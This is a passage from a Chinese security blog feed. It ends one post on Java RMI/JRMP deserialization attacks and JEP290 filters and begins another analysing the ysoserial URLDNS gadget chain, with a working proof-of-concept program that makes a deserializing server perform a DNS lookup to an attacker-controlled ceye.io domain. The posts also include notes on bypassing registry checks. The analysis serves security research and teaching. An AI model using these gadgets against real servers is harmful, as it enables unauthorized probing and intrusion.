class="comment">//该dgcID是一个常量，此处进行了验证</span></span><br><span class="line">Transport transport = id.equals(dgcID) ? <span class="keyword">null</span> : <span class="keyword">this</span>;</span><br><span class="line"><span class="comment">//根据读取出来的id里面的[0，0，0]（三个都是我们序列化写入的值）分别是：</span></span><br><span class="line"><span class="comment">//1.服务端uid给客户端的远程对象唯一标识编号</span></span><br><span class="line"><span class="comment">//2.远程对象有效时长用的时间戳</span></span><br><span class="line"><span class="comment">//3.用于同一时间申请的统一远程对象的另一个用于区分的随机数</span></span><br><span class="line"><span class="comment">//服务端去查询这三个值的hash，判断当前DGC客户端有没有服务端的远程对象</span></span><br><span class="line"><span class="comment">//就是dirty，clean那一套东西</span></span><br><span class="line">Target target =</span><br><span class="line">ObjectTable.getTarget(<span class="keyword">new</span> ObjectEndpoint(id, transport));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (target == <span class="keyword">null</span> || (impl = target.getImpl()) == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> NoSuchObjectException(<span class="string">"no such object in table"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>dgcID：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//dgcID位置sun.rmi.transport.Transport</span></span><br><span class="line"><span class="comment">/** ObjID for DGCImpl */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ObjID dgcID = <span class="keyword">new</span> ObjID(ObjID.DGC_ID);</span><br><span class="line"><span class="comment">//ObjID.DGC_ID位置：java.rmi.server.ObjID</span></span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> DGC_ID = <span class="number">2</span>;</span><br></pre></td></tr></table></figure><p>而这里的2之后的三个0，我们因为攻击服务端，没有去服务端获取过远程对象所以都写成0即可，不然会报错。</p><p>至此DGC层的原理分析以及Ysoserial exploit JRMPClient模块原理分析就完成了。仔细分析自主构建的POC之后会发现这种看着小齿轮完美切合的感觉，相当美感。</p><h3 id="JEP290修复-1"><a href="#JEP290修复-1" class="headerlink" title="JEP290修复"></a>JEP290修复</h3><p>在JEP290规范之后，即JAVA版本6u141, 7u131, 8u121之后，以上攻击就不奏效了。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg171s50s1j31s306x3z0.jpg" alt="JRMP-8u161.png"></p><p>同样被白名单过滤了，<code>sun.rmi.transport.DGCImpl#checkInput</code>过滤器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Status <span class="title">checkInput</span><span class="params">(FilterInfo var0)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//与`sun.rmi.registry.RegistryImpl#registryFilter`处过滤器完全一致</span></span><br><span class="line">    <span class="keyword">if</span> (dgcFilter != <span class="keyword">null</span>) &#123;</span><br><span class="line">        Status var1 = dgcFilter.checkInput(var0);</span><br><span class="line">        <span class="keyword">if</span> (var1 != Status.UNDECIDED) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (var0.depth() &gt; (<span class="keyword">long</span>)DGC_MAX_DEPTH) &#123;</span><br><span class="line">        <span class="keyword">return</span> Status.REJECTED;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Class var2 = var0.serialClass();</span><br><span class="line">        <span class="keyword">if</span> (var2 == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> Status.UNDECIDED;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">while</span>(var2.isArray()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (var0.arrayLength() &gt;= <span class="number">0L</span> &amp;&amp; var0.arrayLength() &gt; (<span class="keyword">long</span>)DGC_MAX_ARRAY_SIZE) &#123;</span><br><span class="line">                    <span class="keyword">return</span> Status.REJECTED;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var2 = var2.getComponentType();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (var2.isPrimitive()) &#123;</span><br><span class="line">                <span class="keyword">return</span> Status.ALLOWED;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//4种白名单限制</span></span><br><span class="line">                <span class="keyword">return</span> var2 != ObjID.class &amp;&amp;</span><br><span class="line">                    var2 != UID.class &amp;&amp;</span><br><span class="line">                    var2 != VMID.class &amp;&amp;</span><br><span class="line">                    var2 != Lease.class ? Status.REJECTED : Status.ALLOWED;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="为什么RMI客户端利用传递参数反序列化攻击RMI服务端就不受JEP290限制"><a href="#为什么RMI客户端利用传递参数反序列化攻击RMI服务端就不受JEP290限制" class="headerlink" title="为什么RMI客户端利用传递参数反序列化攻击RMI服务端就不受JEP290限制"></a>为什么RMI客户端利用传递参数反序列化攻击RMI服务端就不受JEP290限制</h2><p>那是因为JEP290提供了一些系列过滤器形式：进程级过滤器、自定义过滤器、内置过滤器。但是默认只为<strong>RMI注册表</strong>和<strong>RMI分布式垃圾收集器</strong>提供了相应的内置过滤器。这两个过滤器都配置为白名单，即只允许反序列化特定类。（就像我们上面看到的一样）</p><p>但是RMI客户端利用参数反序列化攻击没有也不能跟<strong>RMI注册表</strong>和<strong>RMI分布式垃圾收集器</strong>一样使用内置白名单过滤器。使用了，全给你白名单拦截了，我还怎么序列化传输参数数据，参数数据我甚至要自定义一个类，咋可能在你这小小的白名单中？</p><p>这就是安全性与实际使用场景相冲突导致的，已知的但是迫不得已无法修复的漏洞。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>探测利用开放的RMI服务：</p><ol><li>实际上就是蒙，赌它有这些漏洞RMI服务。</li></ol><p>RMI客户端反序列化攻击RMI服务端：</p><ol><li>不一定是要Object类型的接口才行，只要不是基本类型的参数都可以利用。</li></ol><p>RMI服务端反序列化攻击RMI注册端：</p><ol><li>RMI服务端利用bind攻击注册端的时候，找各种办法把payload变成remote接口这个举动是非必须的，注册端反序列化触发压根不校验。只是为了exp实现而已。</li><li>在将payload变成remote接口的过程中，利用到动态代理，但是压根没有利用到动态代理的”拦截器特性”，只是利用了动态代理可以将任意对象转化接口形式的特性。</li><li>在8u141之后，在利用bind等服务端对于注册端发起的操作时，会因为注册端对于服务端有地址验证而失效。</li><li>利用lookup操作，作为客户端对于注册端发起请求，可以绕过上面的地址验证。</li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>参考统一放在下篇中</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;字数：1w6&lt;/p&gt;
&lt;p&gt;推荐阅读时间：&amp;gt;2h&lt;/p&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;其实起因听老哥讲&lt;strong&gt;“shiro-721可以用JRMP的p
      
    
    </summary>
    
    
      <category term="java" scheme="http://lalajun.com/tags/java/"/>
    
      <category term="rmi" scheme="http://lalajun.com/tags/rmi/"/>
    
  </entry>
  
  <entry>
    <title>JAVA反序列化-ysoserial-URLDNS</title>
    <link href="http://lalajun.com/2020/03/05/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-ysoserial-URLDNS/"/>
    <id>http://lalajun.com/2020/03/05/JAVA反序列化-ysoserial-URLDNS/</id>
    <published>2020-03-05T06:05:33.000Z</published>
    <updated>2020-03-27T08:23:02.315Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>推荐阅读时间：10min</p><p>内容-基础向：</p><ul><li>在IDEA中JAR的三种调试方式</li><li>Ysoserial工具中URLDNS模块的原理分析</li><li>POC代码以及Ysoserial的源码分析</li></ul><blockquote><p>题外话：<br>最近有一个小伙伴用<a href="mailto:**x@v.team" target="_blank" rel="noopener">**x@v.team</a>**的邮箱戳我，已经写好了回件但是由于找不到这个邮箱地址回不回去。莫非<br>用了伪装源地址的骚操作？但是为啥这么做呢emmm…..如果你看到这篇文的话，可以再私戳我认领下回信…..</p></blockquote><h2 id="在IDEA中JAR的三种调试方式"><a href="#在IDEA中JAR的三种调试方式" class="headerlink" title="在IDEA中JAR的三种调试方式"></a>在IDEA中JAR的三种调试方式</h2><p>在开始前，先分享下对于jar文件的三种调试方式。</p><h3 id="JAR起端口的远程调试"><a href="#JAR起端口的远程调试" class="headerlink" title="JAR起端口的远程调试"></a>JAR起端口的远程调试</h3><p>这种调试方式主要针对有界面，启动后不会自动退出的一类jar包。如attackRMI.jar</p><ol><li>调试运行jar，这将会使jar起一个5005端口等待调试器连接</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 -jar attackRMI.jar</span><br></pre></td></tr></table></figure><ol start="2"><li>idea随便一个项目引入这个jar包</li></ol><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gcj1u068c7j30yj0dnmxt.jpg" alt="调试-导入包.png"></p><ol start="3"><li>IDEA调试配置处，配置Remote监听配置——Attach to remote JVM</li></ol><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gcj1u4ru8lj31n913xgo8.jpg" alt="调试1.png"></p><ol start="4"><li>在需要调试的jar包中下断点，选择远程调试器，DEBUG开始调试</li></ol><blockquote><p>可以注意到在配置调试器连接远程监听的时候，有远程JVM的命令代码，如果jdk版本是8以上命令会有所不同，可以手动选择 然后替换命令跑jar。</p></blockquote><h3 id="调试器起端口的远程调试"><a href="#调试器起端口的远程调试" class="headerlink" title="调试器起端口的远程调试"></a>调试器起端口的远程调试</h3><p>但是遇到一些运行后就立马结束退出的情况，比如ysoserial，以上的方法jar起端口等待调试器连接的办法就不成了。（因为立刻退出了，调试器根本来不及连接）</p><p>我们可以换一种方式反一反：让IDEA调试器起端口监听，jar连接至调试端口进行调试</p><ol><li>IDEA配置监听远程调试——Listen to remote JVM</li></ol><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gcj1ub4zftj31nu140n02.jpg" alt="调试2.png"></p><ol start="2"><li>IDEA下断点，开始调试DEBUG，这样IDEA就会起一个5055监听端口</li><li>调试运行JAR，使JAR连接至IDEA-DEGUB端口进行调试：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -agentlib:jdwp=transport=dt_socket,server=n,address=LAPTOP-50N17D1J:5005,suspend=y  -jar F:\BanZ\java\ysoserial.jar</span><br></pre></td></tr></table></figure><blockquote><p>以上的命令不是大家都通用的，可以从IDEA里面复制出来，删除&lt;&gt;的两项可选项即可。</p><p>同样根据jdk版本不同，命令也会有变化。</p></blockquote><h3 id="JAR源代码调试"><a href="#JAR源代码调试" class="headerlink" title="JAR源代码调试"></a>JAR源代码调试</h3><p>通常来说以上两种就够用了，但是还有一种调试方式，在局部调试中更为方便：在源代码中调用特定class文件的main函数进行调试：</p><p>以ysoserial的URLDNS模块为例，由于在ysoserial中所有payload生成接口都可以从<code>ysoserial.GeneratePayload</code>进入，我们可以调用该类的main函数同时指定参数，进入任意payload生成模块。</p><p>看一下GeneratePayload的main函数：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gcj1ujsnrpj31510rbq5f.jpg" alt="调试3-1.png"></p><ol><li>IDEA配置固定class文件，配置传入参数（跟命令行调用一样）</li></ol><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gcj1ueuwpcj31gi0jcjsy.jpg" alt="调试3.png"></p><ol start="2"><li>下断点，开始DEBUG调试</li></ol><h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>那么开始细看<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a>，从最简单的模块开始。</p><p>在渗透测试中，如果对着服务器打一发JAVA反序列化payload，而没有任何回应，往往就不知道问题出在了哪里的蒙蔽状态。</p><ul><li>打成功了，只是对方机器不能出网？</li><li>还是对面JAVA环境与payload版本不一样，改改就可以？</li><li>还是对方没有用这个payload利用链的所需库？利用链所需库的版本不对？换换就可以？</li><li>还是…以上做的都是瞎操作，这里压根没有反序列化readobject点QAQ</li></ul><p>而URLDNS模块正是解决了以上疑惑的最后一个，确认了readobject反序列化利用点的存在。不至于payload改来改去却发现最后是因为压根没有利用点所以没用。同时因为这个利用链不依赖任何第三方库，没有什么限制。</p><p>如果目标服务器存在反序列化动作（readobject），处理了我们的输入，同时按照我们给定的URL地址完成了DNS查询，我们就可以确认是存在反序列化利用点的。</p><p>从JAVA反序列化RCE的三要素（readobject反序列化利用点 + 利用链 + RCE触发点）来说，是通过（readobject反序列化利用点 + DNS查询）来确认readobject反序列化利用点的存在。</p><p>ysoserial payload生成命令：<code>java -jar ysoserial.jar URLDNS &quot;自己能够查询DNS记录的域名&quot;</code><br>（这里可以使用ceye做DNS查询）</p><p>我们先抛开ysoserial，看一下网上的测试代码弄清楚原理，在之后再回过来看ysoserial的实现。</p><p>POC测试代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//0x01.生成payload</span></span><br><span class="line">        <span class="comment">//设置一个hashMap</span></span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> HashMap&lt;URL, String&gt;();</span><br><span class="line">        <span class="comment">//设置我们可以接受DNS查询的地址</span></span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">"http://xxx.ceye.io"</span>);</span><br><span class="line">        <span class="comment">//将URL的hashCode字段设置为允许修改</span></span><br><span class="line">        Field f = Class.forName(<span class="string">"java.net.URL"</span>).getDeclaredField(<span class="string">"hashCode"</span>);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//**以下的蜜汁操作是为了不在put中触发URLDNS查询，如果不这么写就会触发两次（之后会解释）**</span></span><br><span class="line">        <span class="comment">//1. 设置url的hashCode字段为0xdeadbeef（随意的值）</span></span><br><span class="line">        f.set(url, <span class="number">0xdeadbeef</span>); </span><br><span class="line">        <span class="comment">//2. 将url放入hashMap中，右边参数随便写</span></span><br><span class="line">        hashMap.put(url, <span class="string">"rmb122"</span>);</span><br><span class="line">        <span class="comment">//修改url的hashCode字段为-1，为了触发DNS查询（之后会解释）</span></span><br><span class="line">        f.set(url, -<span class="number">1</span>); </span><br><span class="line">        <span class="comment">//0x02.写入文件模拟网络传输</span></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        <span class="comment">//0x03.读取文件，进行反序列化触发payload</span></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在跑通以上代码，有几个注意点：</p><ol><li>不能使用ip+端口进行回显，因为此处功能为DNS查询，ip+端口不属于DNS查询。同时在代码底层对于ip的情况做了限制，不会进行DNS查询。</li><li>最好不要使用burp自带的dns查询，会过一段时间就会变换了，可能会导致坑。这里使用了ceye查看DNSLOG</li></ol><p>直接跑测试一波，有回显</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gcj1urfik2j30wv0gq3zb.jpg" alt="ceye.png"></p><p>从测试代码的<strong>0x01部分</strong>payload生成中，我们可以看个大概payload结构，但是也有一些蜜汁细节，回头再来追究，主要确认三个名词<code>HashMap</code>、<code>URL</code>、<code>HashCode</code>。</p><p>仔细看一下可以知道最终的payload结构是 一个<code>HashMap</code>，里面包含了 一个修改了<code>HashCode</code>为-1的<code>URL</code>类</p><p>那么具体细节我们就直接在<code>ois.readObject();</code>这个反序列化语句中去调试分析过程。</p><p>我们知道java反序列化的执行入口就是<strong>readObject方法</strong>，而我们最外层的包装就是HashMap，那么这个链自然是从HashMap的readObject开始的（这是JAVA反序列化的基础，不了解的话可以从以往的博客补课）。</p><p>找到JDK包中的HashMap类的readObject方法下断点，开始调试：</p><blockquote><p>此处会有一个问题就是我们到底怎么在JDK包中找到HashMap这个类的readobject函数呢？因为JDK的类超级多，难道我们必须要一个个翻找？</p><p>其实搜索是可以搜索导入包的内容的，Ctrl+Shift+F 在Scope - All Places 搜索<code>class hashmap</code>即可</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gcj1uxrbedj30zt0fbdg4.jpg" alt="查找包.png"></p></blockquote><p>然后我们就可以成功开始调试了，但是看着hashmap类中的代码马上就会一头雾水。因为我们根本不了解hashmap是啥。</p><h3 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h3><p>在开始正式调试阅读代码前，我们需要知道HashMap的大致原理：</p><p><a href="https://blog.csdn.net/woshimaxiao1/article/details/83661464" target="_blank" rel="noopener">HashMap</a>是一种为提升操作效率的数据结构，本质在使用上还是存取key-value键值对的使用方式，但是在实现上引入了key值的HASH映射到一维数组的形式来实现，再进入了链表来解决hash碰撞问题（不同的key映射到数组同一位置）。</p><p>从键值对的设置和读取两方面来解释：</p><p>设置新键值对 key-value：</p><ol><li>计算key的hash：Hash(k)</li><li>通过Hash(k)映射到有限的数组a的位置i</li><li>在a[i]的位置存入value</li><li>因为把计算出来的不同的key的hash映射到有限的数组长度，肯定会出现不同的key对应同一个数组位置i的情况。如果发现a[i]已经有了其他key的value，就放入这个i位置后面对应的链表（根据多少的情况可能变为树）中。</li></ol><p>读取key的value：</p><ol><li>计算key的hash：Hash(k)</li><li>通过Hash(k)映射到有限的数组a的位置i</li><li>读取在a[i]的位置的value</li><li>如果发现a[i]已经有了其他key的value，就遍历这个i位置后面对应的链表（根据多少的情况可能变为树）去查找这个key再去取值。</li></ol><h3 id="反序列化过程"><a href="#反序列化过程" class="headerlink" title="反序列化过程"></a>反序列化过程</h3><p>那么这个Hashmap数据结构是如何序列化传输的呢？</p><p><code>java.util.HashMap#writeObject</code>分为三个步骤进行序列化：</p><ol><li>序列化写入一维数组的长度（不是特别确定，但是这个值在反序列化中是不使用的，所以不太重要）</li><li>序列化写入键值对的个数</li><li>序列化写入键值对的键和值；</li></ol><p><code>java.util.HashMap#readObject</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">         <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="comment">//...省略代码...</span></span><br><span class="line">        <span class="comment">//读取一维数组长度，不处理</span></span><br><span class="line">        <span class="comment">//读取键值对个数mappings</span></span><br><span class="line">        <span class="comment">//处理其他操作并初始化</span></span><br><span class="line">        <span class="comment">//遍历反序列化分辨读取key和value</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">        <span class="comment">//URL类也有readObject方法，此处也会执行，但是DNS查询行为不在这，我们跳过</span></span><br><span class="line">                K key = (K) s.readObject();</span><br><span class="line">                V value = (V) s.readObject();</span><br><span class="line">            <span class="comment">//注意以下这句话</span></span><br><span class="line">            putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p> <code>putVal</code>是往HashMap中放入键值对的方法，上面也说到在放入时会计算<strong>key的hash</strong>作为转化为数组位置<strong>i</strong>的映射依据。</p><p><strong>而DNS查询正是在计算URL类的对象的hash的过程中触发的</strong>，即hash(key)。</p><p>跟进<code>hash(key)</code>：<code>java.util.HashMap#hash</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传入的key是一个URL对象，不同对象的hash计算方法是在各自的类中实现的，这里<code>key.hashCode()</code>调用URL类中的hashCode方法：<code>java.net.URL#hashCode</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">transient</span> URLStreamHandler handler; <span class="comment">//这个URL传输实现类是一个transient临时类型，它不会被反序列化（之后会用到）</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> hashCode = -<span class="number">1</span>;<span class="comment">//hashCode是private类型，需要手动开放控制权才可以修改。</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="comment">//判断如果当前对象中的hashCode不为默认值-1的话，就直接返回</span></span><br><span class="line">       <span class="comment">//意思就是如果以前算过了就别再算了</span></span><br><span class="line">       <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">           <span class="keyword">return</span> hashCode;</span><br><span class="line"><span class="comment">//如果没算过，就调用当前URL类的URL传输实现类去计算hashcode</span></span><br><span class="line">       hashCode = handler.hashCode(<span class="keyword">this</span>);<span class="comment">//进入此处</span></span><br><span class="line">       <span class="keyword">return</span> hashCode;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><code>java.net.URLStreamHandler#hashCode</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//此处传入的URL为我们自主写入的接受DNS查询的URL</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> h = <span class="number">0</span>;<span class="comment">//计算的hash结果</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//使用url的协议部分，计算hash</span></span><br><span class="line">        String protocol = u.getProtocol();</span><br><span class="line">        <span class="keyword">if</span> (protocol != <span class="keyword">null</span>)</span><br><span class="line">            h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//**通过url获取目标IP地址**，再计算hash拼接进入</span></span><br><span class="line">        InetAddress addr = getHostAddress(u);</span><br><span class="line">        <span class="keyword">if</span> (addr != <span class="keyword">null</span>) &#123;</span><br><span class="line">            h += addr.hashCode();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="comment">//如果没有获取到，就直接把域名计算hash拼接进入</span></span><br><span class="line">            String host = u.getHost();</span><br><span class="line">            <span class="keyword">if</span> (host != <span class="keyword">null</span>)</span><br><span class="line">                h += host.toLowerCase().hashCode();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>至此我们就看到了<code>getHostAddress(u)</code>这一关键语句，通过我们提供的URL地址去获取对应的IP。再往后还有一些函数调用，但是更为底层，而不太关键，就不继续跟了。</p><p>但有一处值得提一下，之前说到URL要传入一个域名而不能是一个IP，IP不会触发DNS查询是在</p><p><code>java.net.InetAddress#getAllByName(java.lang.String, java.net.InetAddress)</code>中进行了限制：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> InetAddress[] getAllByName(String host, InetAddress reqAddr)</span><br><span class="line">        <span class="keyword">throws</span> UnknownHostException &#123;</span><br><span class="line">...</span><br><span class="line"><span class="comment">// if host is an IP address, we won't do further lookup</span></span><br><span class="line">        <span class="keyword">if</span> (Character.digit(host.charAt(<span class="number">0</span>), <span class="number">16</span>) != -<span class="number">1</span></span><br><span class="line">            || (host.charAt(<span class="number">0</span>) == <span class="string">':'</span>)) &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] addr = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">int</span> numericZone = -<span class="number">1</span>;</span><br><span class="line">            String ifname = <span class="keyword">null</span>;</span><br><span class="line">            <span class="comment">// see if it is IPv4 address</span></span><br><span class="line">            addr = IPAddressUtil.textToNumericFormatV4(host);</span><br><span class="line">            <span class="keyword">if</span> (addr == <span class="keyword">null</span>) &#123;</span><br><span class="line">            ...</span><br></pre></td></tr></table></figure><p>总结一下JDK1.8下的调用路线：</p><ol><li>HashMap-&gt;readObject() </li><li>HashMap-&gt;hash() </li><li>URL-&gt;hashCode() </li><li>URLStreamHandler-&gt;hashCode() </li><li>URLStreamHandler-&gt;getHostAddress() </li><li>InetAddress-&gt;getByName()</li></ol><p>而在jdk1.7u80环境下调用路线会有一处不同，但是大同小异：</p><ol><li>HashMap-&gt;readObject() </li><li><strong>HashMap-&gt;putForCreate()</strong></li><li>HashMap-&gt;hash()</li><li>URL-&gt;hashCode() 